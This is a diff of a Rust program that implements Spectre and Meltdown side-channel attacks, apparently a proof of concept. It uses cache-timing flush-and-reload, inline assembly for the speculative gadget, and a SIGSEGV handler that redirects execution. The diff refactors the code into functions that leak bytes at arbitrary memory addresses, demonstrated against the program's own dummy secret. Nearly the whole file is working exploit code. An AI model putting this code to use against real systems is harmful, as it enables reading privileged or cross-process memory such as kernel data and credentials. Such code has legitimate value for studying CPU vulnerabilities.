@@ -6,13 +6,12 @@ use rand::seq::SliceRandom;
 use rand::thread_rng;
 
 use nix::sys::signal::{sigaction, SaFlags, SigAction, SigHandler, SigSet, Signal};
-use std::convert::TryFrom;
 
 const MULTIPLE_OFFSET: usize = 8192;
 const CACHE_LINE_SIZE: usize = 4096;
 const NB_CYCLES_TRAIN: u64 = 1000;
 const NB_TIMES: usize = 1000;
-const ZERO_TRESHOLD: usize = 997;
+const ZERO_TRESHOLD: usize = 996;
 
 static mut TEST_ARR: [u8; 256 * MULTIPLE_OFFSET + CACHE_LINE_SIZE + 2 * 4096] =
     [0; 256 * MULTIPLE_OFFSET + CACHE_LINE_SIZE + 2 * 4096];
@@ -20,25 +19,29 @@ static mut LATENCIES: [u64; 256] = [0; 256];
 
 static mut BASE_ADDR: usize = 0;
 static mut NB_CYCLES: u64 = 0;
-static mut SPECTRE_LIMIT: u64 = 15;
-static mut SECRET: &[u8] = "000000000000000ILIKEDEADBEEF".as_bytes();
+static mut SPECTRE_LIMIT: u64 = 64;
+static mut SECRET: &[u8] =
+    "0000000000000000000000000000000000000000000000000000000000000000ILIKEDEADBEEF".as_bytes();
 static mut OTHER_SECRET: u64 = 0xfedcba9876543210;
 
 extern "C" fn handle_sigsegv(
-    signal: libc::c_int,
-    info: *mut libc::siginfo_t,
+    _signal: libc::c_int,
+    _info: *mut libc::siginfo_t,
     arg: *mut libc::c_void,
 ) {
     let mut context = unsafe { (arg as *mut libc::ucontext_t).as_mut().unwrap() };
     // very verbose, only uncomment if you want to see that you're leaking data from privileged
     // addresses that you cannot access
+    /*
+    use std::convert::TryFrom;
     let offending_address =
-        unsafe { (*info)._pad[1] as usize | (((*info)._pad[2] as usize) << 32) };
+        unsafe { (*_info)._pad[1] as usize | (((*_info)._pad[2] as usize) << 32) };
     println!(
         "Got {:?} with offending_addres 0x{:x}, ignoring",
-        Signal::try_from(signal).unwrap(),
+        Signal::try_from(_signal).unwrap(),
         offending_address
     );
+    */
     // overwrite RIP to jump to our trampoline (REG_RIP = 16)
     // 15 is the width needed to encode the instructions in release mode,
     // let's set it to 25 and be done with it!
@@ -105,17 +108,15 @@ fn repeat_move_for_training_meltdown() {
     unsafe {
         let train_addr = &TEST_ARR[0] as *const u8 as usize;
 
-        asm!(
-            "mov rax, rcx", "movzx rax, byte ptr [rax]",  "mov rax, rcx", "movzx rax, byte ptr [rax]",  "mov rax, rcx", "movzx rax, byte ptr [rax]",  "mov rax, rcx", "movzx rax, byte ptr [rax]",  "mov rax, rcx", "movzx rax, byte ptr [rax]",  "mov rax, rcx", "movzx rax, byte ptr [rax]",  "mov rax, rcx", "movzx rax, byte ptr [rax]",  "mov rax, rcx", "movzx rax, byte ptr [rax]",  "mov rax, rcx", "movzx rax, byte ptr [rax]",  "mov rax, rcx", "movzx rax, byte ptr [rax]",  "mov rax, rcx", "movzx rax, byte ptr [rax]",  "mov rax, rcx", "movzx rax, byte ptr [rax]",  "mov rax, rcx", "movzx rax, byte ptr [rax]",  "mov rax, rcx", "movzx rax, byte ptr [rax]",  "mov rax, rcx", "movzx rax, byte ptr [rax]",  "mov rax, rcx", "movzx rax, byte ptr [rax]",  "mov rax, rcx", "movzx rax, byte ptr [rax]",  "mov rax, rcx", "movzx rax, byte ptr [rax]",  "mov rax, rcx", "movzx rax, byte ptr [rax]",  "mov rax, rcx", "movzx rax, byte ptr [rax]",  "mov rax, rcx", "movzx rax, byte ptr [rax]",  "mov rax, rcx", "movzx rax, byte ptr [rax]",  "mov rax, rcx", "movzx rax, byte ptr [rax]",  "mov rax, rcx", "movzx rax, byte ptr [rax]",  "mov rax, rcx", "movzx rax, byte ptr [rax]",  "mov rax, rcx", "movzx rax, byte ptr [rax]",  "mov rax, rcx", "movzx rax, byte ptr [rax]",  "mov rax, rcx", "movzx rax, byte ptr [rax]",  "mov rax, rcx", "movzx rax, byte ptr [rax]",  "mov rax, rcx", "movzx rax, byte ptr [rax]",  "mov rax, rcx", "movzx rax, byte ptr [rax]",  "mov rax, rcx", "movzx rax, byte ptr [rax]", "mov rax, rcx", "movzx rax, byte ptr [rax]",  "mov rax, rcx", "movzx rax, byte ptr [rax]",  "mov rax, rcx", "movzx rax, byte ptr [rax]",  "mov rax, rcx", "movzx rax, byte ptr [rax]",  "mov rax, rcx", "movzx rax, byte ptr [rax]",  "mov rax, rcx", "movzx rax, byte ptr [rax]",  "mov rax, rcx", "movzx rax, byte ptr [rax]",  "mov rax, rcx", "movzx rax, byte ptr [rax]",  "mov rax, rcx", "movzx rax, byte ptr [rax]",  "mov rax, rcx", "movzx rax, byte ptr [rax]",  "mov rax, rcx", "movzx rax, byte ptr [rax]",  "mov rax, rcx", "movzx rax, byte ptr [rax]",  "mov rax, rcx", "movzx rax, byte ptr [rax]",  "mov rax, rcx", "movzx rax, byte ptr [rax]",  "mov rax, rcx", "movzx rax, byte ptr [rax]",  "mov rax, rcx", "movzx rax, byte ptr [rax]",  "mov rax, rcx", "movzx rax, byte ptr [rax]",  "mov rax, rcx", "movzx rax, byte ptr [rax]",  "mov rax, rcx", "movzx rax, byte ptr [rax]",  "mov rax, rcx", "movzx rax, byte ptr [rax]",  "mov rax, rcx", "movzx rax, byte ptr [rax]",  "mov rax, rcx", "movzx rax, byte ptr [rax]",  "mov rax, rcx", "movzx rax, byte ptr [rax]",  "mov rax, rcx", "movzx rax, byte ptr [rax]",  "mov rax, rcx", "movzx rax, byte ptr [rax]",  "mov rax, rcx", "movzx rax, byte ptr [rax]",  "mov rax, rcx", "movzx rax, byte ptr [rax]",  "mov rax, rcx", "movzx rax, byte ptr [rax]",  "mov rax, rcx", "movzx rax, byte ptr [rax]",  "mov rax, rcx", "movzx rax, byte ptr [rax]",  "mov rax, rcx", "movzx rax, byte ptr [rax]",  "mov rax, rcx", "movzx rax, byte ptr [rax]",
-            in("rcx") train_addr, out("rax") _);
+        for _ in 0..392 {
+            asm!(
+                "mov rax, rcx", "movzx rax, byte ptr [rax]",
+                in("rcx") train_addr, out("rax") _);
+        }
     }
 }
 
-unsafe fn perform_access(
-    preload_op: unsafe fn(),
-    target_adress: *const u8,
-    nb_bytes: usize,
-) -> Vec<u8> {
+unsafe fn meltdown(preload_op: unsafe fn(), target_adress: *const u8, nb_bytes: usize) -> Vec<u8> {
     sigaction(
         Signal::SIGSEGV,
         &SigAction::new(
@@ -164,45 +165,80 @@ unsafe fn perform_access(
 }
 
 #[inline(always)]
-unsafe fn spectre_test(i: usize) {
-    // we can only read the first 15 bytes, which are all the number 0, so we're safe, right?
+unsafe fn spectre_test(off: usize) {
+    let secret_base = &SECRET[0] as *const _ as usize;
+    let base_addr = BASE_ADDR;
+    // we can only read the first SPECTRE_LIMIT bytes, so we're safe, right?
     // Right!?
-    if i < SPECTRE_LIMIT as usize {
-        std::ptr::read_volatile((BASE_ADDR + (SECRET[i] as usize * MULTIPLE_OFFSET)) as *const u8);
-    }
+    asm!(
+        // if off <= SPECTRE_LIMIT {
+        "mov rcx, [rcx]", "cmp rcx, {2}", "ja 2f",
+        // read_volatile(BASE_ADDR[SECRET[off]*MULTIPLE_OFFSET])
+            // rbx = SECRET[off]
+            "movzx rbx, byte ptr [rax+{0}]",
+            // rbx = SECRET[off]*MULTIPLE_OFFSET
+            "imul rbx, {multiple_offset}",
+            // rax = *(BASE_ADDR+SECRET[off]*MULTIPLE_OFFSET)
+            "movzx rax, byte ptr [{1}+rbx]",
+        // end of loop
+        "2:",
+        in(reg) secret_base, in(reg) base_addr, in(reg) off, multiple_offset = const MULTIPLE_OFFSET, inout("rax") off => _, inout("rcx") &SPECTRE_LIMIT => _, out("rbx") _);
 }
 
-unsafe fn spectre_attack() {
-    let mut string = Vec::new();
-    for i in 0..50 {
-        let mut res = Vec::with_capacity(25);
-        for _ in 0..25 {
+unsafe fn spectre(preload_op: unsafe fn(), address: usize, nb_bytes: usize) -> Vec<u8> {
+    let target = (Wrapping(address) - Wrapping(&SECRET[0] as *const _ as usize)).0;
+    let limit = SPECTRE_LIMIT as usize;
+
+    let mut res = Vec::new();
+    for i in 0..nb_bytes {
+        let mut found = false;
+        for _ in 0..100 {
             // training phase
-            for i in 0..5_000_000 {
-                spectre_test(i % 15);
+            for i in 0..500_000 {
+                spectre_test(i % limit);
             }
 
             // attack phase
             flush_measurement_area();
+            std::arch::x86_64::_mm_prefetch(
+                SECRET as *const _ as *const i8,
+                std::arch::x86_64::_MM_HINT_T0,
+            );
+            std::arch::x86_64::_mm_prefetch(
+                &BASE_ADDR as *const usize as *const i8,
+                std::arch::x86_64::_MM_HINT_T0,
+            );
             std::arch::x86_64::_mm_clflush(&SPECTRE_LIMIT as *const u64 as *const u8);
 
-            let val = (Wrapping(&SECRET[0] as *const u8 as usize)
-                - Wrapping(SECRET as *const [u8] as *const u8 as usize)
-                + Wrapping(i))
-            .0;
+            preload_op();
+            asm!("mfence", "lfence");
 
-            spectre_test(val);
+            spectre_test(target + i);
 
-            res.push(measure_byte().unwrap_or(0));
+            let measured_byte = measure_byte().unwrap_or(0);
+            if measured_byte != 0 {
+                res.push(measured_byte);
+                found = true;
+                break;
+            }
         }
-        string.push(*res.iter().max().unwrap());
+        if !found {
+            res.push(0);
+        }
     }
 
-    println!("{}", String::from_utf8_unchecked(string));
+    res
 }
 
-fn read_ptr(preload_op: unsafe fn(), target_adress: usize) -> usize {
-    let vec = unsafe { perform_access(preload_op, target_adress as *const u8, 8) };
+fn read_ptr_meltdown(preload_op: unsafe fn(), target_adress: usize) -> usize {
+    let vec = unsafe { meltdown(preload_op, target_adress as *const u8, 8) };
+    vec.iter()
+        .enumerate()
+        .fold(0, |acc, (pos, e)| acc | ((*e as usize) << (pos * 8)))
+}
+
+fn read_ptr_spectre(preload_op: unsafe fn(), target_adress: usize) -> usize {
+    let vec = unsafe { spectre(preload_op, target_adress, 8) };
     vec.iter()
         .enumerate()
         .fold(0, |acc, (pos, e)| acc | ((*e as usize) << (pos * 8)))
@@ -234,7 +270,13 @@ fn setup_measurements() {
         }
         read_flushed_time /= NB_CYCLES_TRAIN;
 
-        NB_CYCLES = read_cached_time + (read_flushed_time - read_cached_time) / 2;
+        NB_CYCLES = std::cmp::min(
+            200,
+            std::cmp::max(
+                160,
+                read_cached_time + (read_flushed_time - read_cached_time) / 2,
+            ),
+        );
 
         println!(
             "time to read a:\n- cached entry: {}\n- cold entry: {}\nFixing the treshold at {} cycles",
@@ -246,28 +288,13 @@ fn setup_measurements() {
 fn main() {
     setup_measurements();
 
-    unsafe {
-        spectre_attack();
-    }
-    // meltdown
-    /*
-    let args = std::env::args().collect::<Vec<String>>();
-    let addr = usize::from_str_radix(&args[1][2..], 16).unwrap();
+    println!(
+        "With Spectre: 0x{:x}",
+        read_ptr_spectre(|| {}, unsafe { &OTHER_SECRET as *const _ as usize })
+    );
 
-    unsafe {
-        println!("Trying to read 64 bytes at 0x{:x}", addr);
-        let bytes = perform_access(
-            || {
-                std::fs::read_to_string("/proc/version").unwrap();
-            },
-            addr as *const u8,
-            64,
-        );
-        println!("Bytes read: {:?}", bytes);
-        println!(
-            "String representation: \"{}\"",
-            std::str::from_utf8_unchecked(&bytes)
-        );
-    }
-    */
+    println!(
+        "With Meltdown: 0x{:x}",
+        read_ptr_meltdown(|| {}, unsafe { &OTHER_SECRET as *const _ as usize })
+    );
 }
